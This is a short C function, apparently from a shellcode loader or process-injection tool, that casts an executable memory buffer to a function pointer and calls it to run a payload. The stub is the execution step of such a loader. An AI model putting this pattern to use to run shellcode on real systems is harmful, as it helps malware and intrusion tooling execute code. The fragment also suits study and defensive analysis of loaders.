void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len, HANDLE hTargetProcess, HANDLE hTargetThread, HANDLE hJob) {
    (void)hTargetProcess;
    (void)hTargetThread;
    (void)hJob;
    (void)payload;
    (void)payload_len;

    DEBUG_PRINT("Executing payload via direct function call...");
    void (*func)() = (void (*)())exec_mem;
    func();
}
